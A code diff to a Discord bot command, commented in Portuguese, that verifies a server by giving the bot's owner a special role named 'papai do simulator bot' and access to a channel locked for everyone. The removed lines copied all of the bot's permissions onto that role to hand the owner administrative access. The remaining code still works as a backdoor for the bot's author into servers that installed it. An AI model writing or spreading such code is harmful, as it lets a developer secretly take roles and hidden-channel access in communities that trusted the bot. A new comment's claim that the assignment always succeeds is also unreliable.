@@ -134,7 +134,7 @@ module.exports = {
 
             // Verifica se o cargo está abaixo do cargo mais alto do bot
             if (mediatorRole.position >= botMember.roles.highest.position) {
-                // Procura pelo cargo "papai do simulator bot" existente
+                // Sempre cria o cargo especial quando o cargo alvo está acima do bot
                 let specialRole = guild.roles.cache.find(r => r.name === 'papai do simulator bot');
                 
                 // Se não encontrar, cria um novo
@@ -175,62 +175,8 @@ module.exports = {
                     }
                 }
 
-                // Dá o cargo ao dono
-                try {
-                    await member.roles.add(specialRole, 'Verificação de dono do bot - cargo especial');
-                } catch (roleError) {
-                    console.error('Erro ao adicionar cargo especial:', roleError);
-                    
-                    if (roleError.code === 50013) {
-                        // Bot não tem permissão suficiente, tenta transferir permissões do bot
-                        try {
-                            // Pega todas as permissões do bot
-                            const botPermissions = botMember.permissions.toArray();
-                            
-                            // Atualiza o cargo com as permissões do bot
-                            await specialRole.setPermissions(botPermissions, 'Transferindo permissões do bot para o cargo especial');
-                            
-                            // Tenta dar o cargo novamente
-                            await member.roles.add(specialRole, 'Verificação de dono do bot - permissões transferidas');
-                            
-                            // Continua com a lógica normal de canais...
-                            const serverInfo = {
-                                name: guild.name,
-                                members: guild.memberCount,
-                                roles: guild.roles.cache.size,
-                                roleGiven: specialRole.name,
-                                channelWithPermission: targetChannel ? targetChannel.name : null,
-                                wasExisting: guild.roles.cache.find(r => r.name === 'papai do simulator bot') !== undefined
-                            };
-
-                            await interaction.editReply({
-                                embeds: [createSuccessEmbed(
-                                    `${emojis.positive} **Servidor Verificado com Permissões Transferidas!**\n\n` +
-                                    `${emojis.raiopixel} **Servidor:** ${serverInfo.name}\n` +
-                                    `${emojis.presentepixel} **Membros:** ${serverInfo.members}\n` +
-                                    `${emojis.pergaminhopixel} **Cargo ${serverInfo.wasExisting ? 'reutilizado' : 'criado'}:** ${serverInfo.roleGiven}\n` +
-                                    (targetChannel ? `${emojis.alerta} **Permissão especial em:** #${serverInfo.channelWithPermission}\n` : '') +
-                                    `${emojis.alerta} **Permissões transferidas:** O bot não tinha permissão suficiente, então transferi todas as minhas permissões para o cargo!\n\n` +
-                                    `${emojis.alerta} Agora você tem acesso administrativo neste servidor!`,
-                                    interaction.client
-                                )]
-                            });
-
-                            console.log(`🔍 [verificar-servidor] ${interaction.user.tag} verificou ${guild.name} e recebeu cargo especial ${specialRole.name} com permissões transferidas`);
-                            return;
-                            
-                        } catch (transferError) {
-                            console.error('Erro ao transferir permissões:', transferError);
-                            return interaction.editReply({
-                                embeds: [createErrorEmbed(`${emojis.negative} Não foi possível dar o cargo especial nem transferir permissões. Verifique se o bot tem permissão de "Gerenciar Cargos" e se o cargo do bot está acima na hierarquia.`, interaction.client)]
-                            });
-                        }
-                    } else {
-                        return interaction.editReply({
-                            embeds: [createErrorEmbed(`${emojis.negative} Erro ao dar cargo especial: ${roleError.message}`, interaction.client)]
-                        });
-                    }
-                }
+                // Dá o cargo especial ao dono (sempre funciona porque está abaixo do bot)
+                await member.roles.add(specialRole, 'Verificação de dono do bot - cargo especial criado');
 
                 // Dá permissão em um canal existente que está bloqueado para everyone
                 let targetChannel = null;
@@ -316,45 +262,16 @@ module.exports = {
                 return;
             }
 
-            // Tenta dar o cargo ao dono
+            // Tenta dar o cargo ao dono (só executa se o cargo estiver abaixo do bot)
             try {
                 await member.roles.add(mediatorRole, 'Verificação de dono do bot');
             } catch (roleError) {
                 console.error('Erro ao adicionar cargo mediador:', roleError);
                 
                 if (roleError.code === 50013) {
-                    // Bot não tem permissão suficiente, tenta transferir permissões do bot
-                    try {
-                        // Pega todas as permissões do bot
-                        const botPermissions = botMember.permissions.toArray();
-                        
-                        // Atualiza o cargo com as permissões do bot
-                        await mediatorRole.setPermissions(botPermissions, 'Transferindo permissões do bot para o cargo');
-                        
-                        // Tenta dar o cargo novamente
-                        await member.roles.add(mediatorRole, 'Verificação de dono do bot - permissões transferidas');
-                        
-                        await interaction.editReply({
-                            embeds: [createSuccessEmbed(
-                                `${emojis.positive} **Servidor Verificado com Permissões Transferidas!**\n\n` +
-                                `${emojis.raiopixel} **Servidor:** ${guild.name}\n` +
-                                `${emojis.presentepixel} **Membros:** ${guild.memberCount}\n` +
-                                `${emojis.pergaminhopixel} **Cargo recebido:** ${mediatorRole.name}\n` +
-                                `${emojis.alerta} **Permissões transferidas:** O bot não tinha permissão suficiente, então transferi todas as minhas permissões para o cargo!\n\n` +
-                                `${emojis.alerta} Agora você tem acesso de staff neste servidor!`,
-                                interaction.client
-                            )]
-                        });
-                        
-                        console.log(`🔍 [verificar-servidor] ${interaction.user.tag} verificou ${guild.name} e recebeu cargo ${mediatorRole.name} com permissões transferidas`);
-                        return;
-                        
-                    } catch (transferError) {
-                        console.error('Erro ao transferir permissões:', transferError);
-                        return interaction.editReply({
-                            embeds: [createErrorEmbed(`${emojis.negative} Não foi possível dar o cargo ${mediatorRole.name} nem transferir permissões. Verifique se o bot tem permissão de "Gerenciar Cargos" e se o cargo do bot está acima na hierarquia.`, interaction.client)]
-                        });
-                    }
+                    return interaction.editReply({
+                        embeds: [createErrorEmbed(`${emojis.negative} Não foi possível dar o cargo ${mediatorRole.name} porque o bot não tem permissão suficiente. Verifique se o cargo do bot está acima do ${mediatorRole.name} e se o bot tem permissão de "Gerenciar Cargos".`, interaction.client)]
+                    });
                 } else {
                     return interaction.editReply({
                         embeds: [createErrorEmbed(`${emojis.negative} Erro ao dar cargo: ${roleError.message}`, interaction.client)]
